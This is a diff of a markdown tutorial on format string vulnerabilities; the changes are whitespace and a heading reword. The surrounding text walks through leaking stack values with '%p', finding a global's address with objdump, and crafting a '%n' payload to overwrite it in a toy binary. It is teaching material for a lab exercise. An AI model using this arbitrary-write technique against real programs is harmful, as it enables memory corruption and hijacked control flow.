@@ -3,7 +3,7 @@
 Format string vulnerabilities silly bug that is due to the poor coding practice
 of the programmer. If an programmer passes an attacker controlled buffer as an
 argument to a `printf` call (or any format string related function, e.g `sprintf,
-fprintf`), attacker can perform write to arbitrary memory address.
+fprintf`), attacker can perform write to arbitrary memory address.  
 
 To understand what I am talking about, take a look at the below example.
 
@@ -96,9 +96,9 @@ int main(int argc, char** argv)
 ```
 Now I will demonstrate Change of control flow using the techniques we have just
 learned. Consider the above mentioned code. Find out the address of the buffer
-from the current stack location using format string vuln.  
+from the current stack location using format string vuln.    
 `echo -e 'AAAA %p %p %p %p %p %p %p %p %p %p %p %p' | ./string1`  
-Output:
+Output:  
 `AAAA 0x1 0xf7ffd918 0xf0b5ff 0xffffd59e 0x1 0xc2 0xffffd694 0xffffd59e
 0xffffd69c 0x41414141 0x20702520 0x25207025`.  
 Hey its again the same the 10th location. :metal:  
@@ -114,9 +114,11 @@ buffer instead of `0x41414141`. If we do so, then %n will write to that memory
 pointed by that location.
 Why not getting the address of `myvar`. Since it is global, we can get the
 address of globals before the running the program.  
-We will use , `objdump -t ./string1 | grep myvar`  
-`0804a028 g     O .bss	00000004              myvar`  
-The first data column contains the address for the `myvar`.  
+We will use , `objdump -t ./string1 | grep myvar`    
+`0804a028 g     O .bss	00000004              myvar`    
+The first data column contains the address for the `myvar`.   
+
+
 **Crafting the exploit** to change the variable content then change the control
 flow.
 `` echo -e `python -c "import struct; print struct.pack('<I',0x0804a028)"`"%p %p
@@ -127,7 +129,7 @@ Cool you changed it .. :)``
 
 :cool: We have exploited the binary.
 
-#### What we have learnt:
+#### What we have learnt with this?
 Format string vulnerability allows to write to arbitrary location in programs
 memory.
 
